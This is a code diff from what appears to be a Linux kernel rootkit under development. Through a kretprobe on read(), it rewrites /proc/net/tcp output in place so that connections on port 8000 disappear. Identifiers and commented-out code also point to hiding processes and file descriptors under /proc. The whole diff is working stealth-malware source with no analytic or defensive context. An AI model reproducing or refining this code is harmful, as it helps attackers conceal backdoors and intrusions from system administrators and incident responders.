@@ -148,21 +148,20 @@ static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *reg
     // pr_info("read (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
     // pr_info("path=%s, sb=%s, name=%s, open_fds=%ld\n", path, sb->s_id, process_to_hide->comm, open_fds);
 
+    if(buffer_count == 0)
+        return 0;
 
     if(strcmp(sb->s_id, "proc") == 0){
         if(ends_with(path, "/net/tcp")){
-            char* buffer = kzalloc(args->count, GFP_KERNEL);
-
-            char* buffer_ptr = buffer;
 
             int index = -1;
             unsigned long address = -1;
             unsigned short port = -1;
 
-
             char* row_start = args->buffer_ptr;
+            int new_length = 0;
             for(int row = 0; *row_start != '\0' ; row++){
-                pr_info("Row Index %d\n", row);
+                pr_info("Row Index %d len: %d\n", row, new_length);
 
                 int row_length = 0;
 
@@ -175,7 +174,7 @@ static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *reg
 
                 if(row == 0){
                     // first-row copy
-                    strncpy(buffer_ptr, row_start, row_length);
+                    new_length += row_length;
                 } else {
                     int result = sscanf(row_start, "%d: %lX:%hX", &index, &address, &port);
                     
@@ -183,54 +182,36 @@ static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *reg
                         // in regular row
                         if(port != 8000){
                             pr_info("Coping index %d address %X port %d\n", index, address, port);
-                            strncpy(buffer_ptr, row_start, row_length);
+                            strncpy(args->buffer_ptr + new_length, row_start, row_length);
+                            new_length += row_length;
                         }  else{
                             pr_info("Filtering index %d address %X port %d\n", index, address, port);
                         }      
                     } else{
                         pr_warn("Cant Parse line \n");
+                        new_length += row_length;
                     }
                 }
 
-                buffer_ptr += row_length;
                 row_start += row_length;
-            }            
+            }
+            // char* s = (((char*) args->buffer_ptr) + new_length);
+            // pr_info("new_length=%d last_c=%X current_c=%X, last=%s\n", new_length, *(s-1) ,*s, s);
+            // *s = '\0';
+            // *(s+1) = '\0';
 
+            // mark the end of string 
+            // {
+            //     int count = args->count - new_length;
+            //     memset(args->buffer_ptr + new_length, '\0', count);
+            // }
 
-            
+            regs_set_return_value(regs, new_length);            
             //pr_info("cybering read(fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
             //pr_info("path=%s, sb=%s, name=%s, open_fds=%ld\n", path, sb->s_id, process_to_hide->comm, open_fds);
-            pr_info("size=%ld, content= %s\n",args->count , args->buffer_ptr);
-
-            strncpy(args->buffer_ptr, buffer, args->count);
-            pr_info("new_content= %s\n", buffer);
-
-            kfree(buffer);
+            //pr_info("size=%ld, content= %s\n",args->count, args->buffer_ptr);
         }
     }
-//
-//    // checking if the vfs is proc
-//    if(strcmp(sb->s_id, "proc") == 0){
-//        if(strcmp(path, hide_pid_path) == 0){
-//            pr_info("found usage in path=%s\n", path);
-//
-//            {
-//                unsigned long offset = 0;
-//
-//                // find entry to hide
-//                while(offset < new_size){
-//                    struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr + offset);
-//                    pr_info("name=%s\n", current_ent->d_name);
-//                    offset += current_ent->d_reclen;
-//                }
-//            }
-//
-//            char* fd_name = "3";
-//            unsigned int new_size2 = hide_entry(args->buffer_ptr, new_size, hide_entry_by_name, fd_name);
-//            regs_set_return_value(regs, new_size2);
-//        }
-//    }
-
     return 0;
 }
 
